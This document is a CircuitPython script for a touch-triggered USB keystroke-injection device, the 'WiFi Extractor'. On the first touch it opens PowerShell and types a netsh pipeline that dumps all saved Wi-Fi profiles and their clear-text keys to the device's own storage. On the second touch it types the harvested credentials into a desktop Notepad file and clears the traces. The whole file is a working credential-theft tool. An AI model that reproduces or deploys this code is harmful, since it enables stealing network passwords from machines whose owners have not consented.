import time
import board
import digitalio
import usb_hid
import neopixel

from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

# Initialize
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)
touch = digitalio.DigitalInOut(board.GP15)
touch.direction = digitalio.Direction.INPUT
touch.pull = digitalio.Pull.UP
led = neopixel.NeoPixel(board.GP16, 1, brightness=0.3, auto_write=True)

# States
STATE_FILE = "/state.txt"
IDLE = 0
WAITING = 1

state = IDLE
touch_was_pressed = False

def led_color(r, g, b):
    led[0] = (r, g, b)

def load_state():
    try:
        with open(STATE_FILE, "r") as f:
            return f.read().strip()
    except OSError:
        return "IDLE"

def set_state_from_string(s):
    global state
    if s == "WAITING":
        state = WAITING
    else:
        state = IDLE

# ---- LOAD PERSISTENT STATE ----
persisted = load_state()
set_state_from_string(persisted)

# Set initial LED color based on state
if state == WAITING:
    led_color(255, 255, 0)  # Yellow
    print("Resuming in WAITING state")
else:
    led_color(255, 0, 0)    # Red
    print("Starting in IDLE state")

def extract_phase():
    global state
    print("Touch detected. Starting extraction...")
    led_color(0, 0, 255)  # Blue
    
    # Open PowerShell
    keyboard.press(Keycode.WINDOWS, Keycode.R)
    keyboard.release_all()
    time.sleep(2)
    layout.write('powershell\n')
    time.sleep(5)
    
    # Extract commands and Update state to WAITING
    layout.write('$cp = (Get-Volume -FileSystemLabel "CIRCUITPY").DriveLetter\n'
                 '$out = Join-Path "${cp}:" "wifi_dump.txt"\n'
                 '(netsh wlan show profiles) | '
                 'Select-String "\\:(.+)$" | '
                 '%{$name=$_.Matches.Groups[1].Value.Trim(); $_} | '
                 '%{netsh wlan show profile name="$name" key=clear} | '
                 'Select-String "Key Content\\W+\\:(.+)$" | '
                 '%{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | '
                 '%{ "$name : $pass" } | '
                 'Out-File -Encoding ASCII $out\n'
                 '$state = Join-Path "${cp}:" "state.txt"\n'
                 'Set-Content -Encoding ASCII $state "WAITING"\n'
                 'exit\n')
    time.sleep(3)
    
    state = WAITING

    time.sleep(1)

    led_color(255, 255, 0)  # Yellow
    print("Extraction complete. Touch again for output.")

def read_wifi_dump():
    try:
        with open("/wifi_dump.txt", "r") as f:
            return f.read()
    except OSError:
        return ""

def sanitize_for_hid(text):
    safe = []
    for ch in text:
        if ch == "\r":
            continue          # drop CR completely
        elif ch == "\n":
            safe.append("\n") # keep newline
        elif 32 <= ord(ch) <= 126:
            safe.append(ch)   # printable ASCII
        else:
            safe.append("?")  # replace anything exotic
    return "".join(safe)

def persist_state_ps(new_state):
    keyboard.press(Keycode.WINDOWS, Keycode.R)
    keyboard.release_all()
    time.sleep(1)

    layout.write("powershell\n")
    time.sleep(3)

    layout.write(
        '$cp = (Get-Volume -FileSystemLabel "CIRCUITPY").DriveLetter\n'
        '$state = Join-Path "${cp}:" "state.txt"\n'
        f'Set-Content -Encoding ASCII $state "{new_state}"\n'
        'exit\n'
    )
    time.sleep(3)

# Notepad method to display output
def output_phase():
    global state
    print("Displaying output...")
    led_color(0, 255, 0)  # Green
    
    wifi_data = read_wifi_dump()

    if not wifi_data.strip():
        print("No WiFi credentials   found.")
        
        state = IDLE

        # Save state in persistent storage
        persist_state_ps("IDLE")

        led_color(255, 0, 0)  # Red
        print("State reset to IDLE. Ready for new extraction cycle.")
        return

    # Normalize line endings (CRITICAL)
    # wifi_data = wifi_data.replace("\r\n", "\n").replace("\r", "\n")
    wifi_data = sanitize_for_hid(wifi_data)

    # Create WiFi_Credentials.txt if it doesn't exist
    keyboard.press(Keycode.WINDOWS, Keycode.R)
    keyboard.release_all()
    time.sleep(1)

    layout.write("powershell\n")
    time.sleep(3)

    layout.write('$path = "$env:USERPROFILE\\Desktop\\WiFi_Credentials.txt"\n'
                 'if (-not (Test-Path $path)) { New-Item -Path $path -ItemType File | Out-Null }\n'
                 'exit\n')
    time.sleep(3)

    # Open Notepad
    keyboard.press(Keycode.WINDOWS, Keycode.R)
    keyboard.release_all()
    time.sleep(1)
    layout.write("notepad %USERPROFILE%\\Desktop\\WiFi_Credentials.txt\n")
    time.sleep(5)
    
    # Type contents
    layout.write("WiFi Credentials Extracted\n")
    layout.write("=" * 30 + "\n\n")
    layout.write(wifi_data)
    layout.write("\n")
    time.sleep(0.5)

    # Save Notepad file
    keyboard.press(Keycode.CONTROL, Keycode.S)
    keyboard.release_all()
    time.sleep(2)
    
    # Close Notepad
    keyboard.press(Keycode.ALT, Keycode.F4)
    keyboard.release_all()
    time.sleep(2)

    # Open PowerShell to clear wifi_dump and reset state
    keyboard.press(Keycode.WINDOWS, Keycode.R)
    keyboard.release_all()
    time.sleep(2)

    layout.write("powershell\n")
    time.sleep(3)

    # Clear wifi_dump file and reset state to IDLE
    layout.write('$cp = (Get-Volume -FileSystemLabel "CIRCUITPY").DriveLetter\n'
                 '$out = Join-Path "${cp}:" "wifi_dump.txt"\n'
                 'if (Test-Path $out) { Clear-Content $out }\n'
                 '$state = Join-Path "${cp}:" "state.txt"\n'
                 'Set-Content -Encoding ASCII $state "IDLE"\n'
                 'exit\n')
    time.sleep(3)

    state = IDLE

    time.sleep(1)

    led_color(255, 0, 0)  # Red
    print("Output created. Ready for new extraction cycle.")

# ---- WAIT FOR TOUCH SENSOR TO STABILIZE ----
print("Waiting for touch sensor release...")
while not touch.value:
    time.sleep(0.05)

print("Touch sensor ready.")

# Main loop
print("WiFi Extractor Ready")

while True:
    if not touch.value and not touch_was_pressed:
        touch_was_pressed = True
        
        if state == IDLE:
            print("Touch Sensor to start extraction.")
            extract_phase()
        elif state == WAITING:
            output_phase()
    
    if touch.value and touch_was_pressed:
        touch_was_pressed = False
    
    time.sleep(0.1)